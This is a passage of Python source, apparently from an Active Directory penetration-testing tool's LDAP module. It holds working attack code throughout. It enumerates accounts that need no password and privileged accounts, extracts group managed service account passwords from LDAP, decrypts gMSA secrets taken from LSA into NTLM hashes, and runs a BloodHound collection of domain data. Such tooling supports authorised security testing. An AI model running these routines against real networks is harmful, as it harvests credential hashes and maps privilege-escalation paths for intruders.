                        memberOf = str(attribute["vals"][0])
                    elif str(attribute["type"]) == "pwdLastSet":
                        pwdLastSet = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                    elif str(attribute["type"]) == "lastLogon":
                        lastLogon = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {e}")
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(value[0])
        else:
            self.logger.fail("No entries found!")

    def password_not_required(self):
        # Building the search filter
        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=32)"
        try:
            self.logger.debug(f"Search Filter={searchFilter}")
            resp = self.ldapConnection.search(
                searchFilter=searchFilter,
                attributes=[
                    "sAMAccountName",
                    "pwdLastSet",
                    "MemberOf",
                    "userAccountControl",
                    "lastLogon",
                ],
                sizeLimit=0,
            )
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                self.logger.debug("sizeLimitExceeded exception caught, giving up and processing the data received")
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
            else:
                return False
        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ""
            memberOf = ""
            pwdLastSet = ""
            userAccountControl = 0
            status = "enabled"
            lastLogon = "N/A"
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        sAMAccountName = str(attribute["vals"][0])
                        mustCommit = True
                    elif str(attribute["type"]) == "userAccountControl":
                        if int(attribute["vals"][0]) & 2:
                            status = "disabled"
                        userAccountControl = f"0x{int(attribute['vals'][0]):x}"
                    elif str(attribute["type"]) == "memberOf":
                        memberOf = str(attribute["vals"][0])
                    elif str(attribute["type"]) == "pwdLastSet":
                        pwdLastSet = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                    elif str(attribute["type"]) == "lastLogon":
                        lastLogon = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                            status,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {e!s}")
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(f"User: {value[0]} Status: {value[5]}")
        else:
            self.logger.fail("No entries found!")

    def admin_count(self):
        # Building the search filter
        searchFilter = "(adminCount=1)"
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(searchFilter, attributes, 0)
        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ""
            memberOf = ""
            pwdLastSet = ""
            userAccountControl = 0
            lastLogon = "N/A"
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        sAMAccountName = str(attribute["vals"][0])
                        mustCommit = True
                    elif str(attribute["type"]) == "userAccountControl":
                        userAccountControl = "0x%x" % int(attribute["vals"][0])
                    elif str(attribute["type"]) == "memberOf":
                        memberOf = str(attribute["vals"][0])
                    elif str(attribute["type"]) == "pwdLastSet":
                        pwdLastSet = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                    elif str(attribute["type"]) == "lastLogon":
                        lastLogon = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {e!s}")
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(value[0])
        else:
            self.logger.fail("No entries found!")

    def gmsa(self):
        self.logger.display("Getting GMSA Passwords")
        search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
        gmsa_accounts = self.ldapConnection.search(
            searchFilter=search_filter,
            attributes=[
                "sAMAccountName",
                "msDS-ManagedPassword",
                "msDS-GroupMSAMembership",
            ],
            sizeLimit=0,
            searchBase=self.baseDN,
        )
        if gmsa_accounts:
            self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

            for item in gmsa_accounts:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                sAMAccountName = ""
                passwd = ""
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        sAMAccountName = str(attribute["vals"][0])
                    if str(attribute["type"]) == "msDS-ManagedPassword":
                        data = attribute["vals"][0].asOctets()
                        blob = MSDS_MANAGEDPASSWORD_BLOB()
                        blob.fromString(data)
                        currentPassword = blob["CurrentPassword"][:-2]
                        ntlm_hash = MD4.new()
                        ntlm_hash.update(currentPassword)
                        passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                self.logger.highlight(f"Account: {sAMAccountName:<20} NTLM: {passwd}")
        return True

    def decipher_gmsa_name(self, domain_name=None, account_name=None):
        # https://aadinternals.com/post/gmsa/
        gmsa_account_name = (domain_name + account_name).upper()
        self.logger.debug(f"GMSA name for {gmsa_account_name}")
        bin_account_name = gmsa_account_name.encode("utf-16le")
        bin_hash = hmac.new(bytes("", "latin-1"), msg=bin_account_name, digestmod=hashlib.sha256).digest()
        hex_letters = "0123456789abcdef"
        str_hash = ""
        for b in bin_hash:
            str_hash += hex_letters[b & 0x0F]
            str_hash += hex_letters[b >> 0x04]
        self.logger.debug(f"Hash2: {str_hash}")
        return str_hash

    def gmsa_convert_id(self):
        if self.args.gmsa_convert_id:
            if len(self.args.gmsa_convert_id) != 64:
                self.logger.fail("Length of the gmsa id not correct :'(")
            else:
                # getting the gmsa account
                search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
                gmsa_accounts = self.ldapConnection.search(
                    searchFilter=search_filter,
                    attributes=["sAMAccountName"],
                    sizeLimit=0,
                    searchBase=self.baseDN,
                )
                if gmsa_accounts:
                    self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

                    for item in gmsa_accounts:
                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                            continue
                        sAMAccountName = ""
                        for attribute in item["attributes"]:
                            if str(attribute["type"]) == "sAMAccountName":
                                sAMAccountName = str(attribute["vals"][0])
                                if self.decipher_gmsa_name(self.domain.split(".")[0], sAMAccountName[:-1]) == self.args.gmsa_convert_id:
                                    self.logger.highlight(f"Account: {sAMAccountName:<20} ID: {self.args.gmsa_convert_id}")
                                    break
        else:
            self.logger.fail("No string provided :'(")

    def gmsa_decrypt_lsa(self):
        if self.args.gmsa_decrypt_lsa:
            if "_SC_GMSA_{84A78B8C" in self.args.gmsa_decrypt_lsa:
                gmsa = self.args.gmsa_decrypt_lsa.split("_")[4].split(":")
                gmsa_id = gmsa[0]
                gmsa_pass = gmsa[1]
                # getting the gmsa account
                search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
                gmsa_accounts = self.ldapConnection.search(
                    searchFilter=search_filter,
                    attributes=["sAMAccountName"],
                    sizeLimit=0,
                    searchBase=self.baseDN,
                )
                if gmsa_accounts:
                    self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

                    for item in gmsa_accounts:
                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                            continue
                        sAMAccountName = ""
                        for attribute in item["attributes"]:
                            if str(attribute["type"]) == "sAMAccountName":
                                sAMAccountName = str(attribute["vals"][0])
                                if self.decipher_gmsa_name(self.domain.split(".")[0], sAMAccountName[:-1]) == gmsa_id:
                                    gmsa_id = sAMAccountName
                                    break
                # convert to ntlm
                data = bytes.fromhex(gmsa_pass)
                blob = MSDS_MANAGEDPASSWORD_BLOB()
                blob.fromString(data)
                currentPassword = blob["CurrentPassword"][:-2]
                ntlm_hash = MD4.new()
                ntlm_hash.update(currentPassword)
                passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                self.logger.highlight(f"Account: {gmsa_id:<20} NTLM: {passwd}")
        else:
            self.logger.fail("No string provided :'(")

    def bloodhound(self):
        auth = ADAuthentication(
            username=self.username,
            password=self.password,
            domain=self.domain,
            lm_hash=self.nthash,
            nt_hash=self.nthash,
            aeskey=self.aesKey,
            kdc=self.kdcHost,
            auth_method="auto",
        )
        ad = AD(
            auth=auth,
            domain=self.domain,
            nameserver=self.args.nameserver,
            dns_tcp=False,
            dns_timeout=3,
        )
        collect = resolve_collection_methods("Default" if not self.args.collection else self.args.collection)
        if not collect:
            return
        self.logger.highlight("Resolved collection methods: " + ", ".join(list(collect)))

        self.logger.debug("Using DNS to retrieve domain information")
        ad.dns_resolve(domain=self.domain)

        if self.args.kerberos:
            self.logger.highlight("Using kerberos auth without ccache, getting TGT")
            auth.get_tgt()
        if self.args.use_kcache:
            self.logger.highlight("Using kerberos auth from ccache")

        timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S") + "_"
        bloodhound = BloodHound(ad, self.hostname, self.host, self.port)
        bloodhound.connect()

        bloodhound.run(
            collect=collect,
            num_workers=10,
            disable_pooling=False,
            timestamp=timestamp,
            computerfile=None,
            cachefile=None,
            exclude_dcs=False,
        )

        self.logger.highlight(f"Compressing output into {self.output_filename}bloodhound.zip")
        list_of_files = os.listdir(os.getcwd())
        with ZipFile(self.output_filename + "bloodhound.zip", "w") as z:
            for each_file in list_of_files:
                if each_file.startswith(timestamp) and each_file.endswith("json"):
                    z.write(each_file)
                    os.remove(each_file)
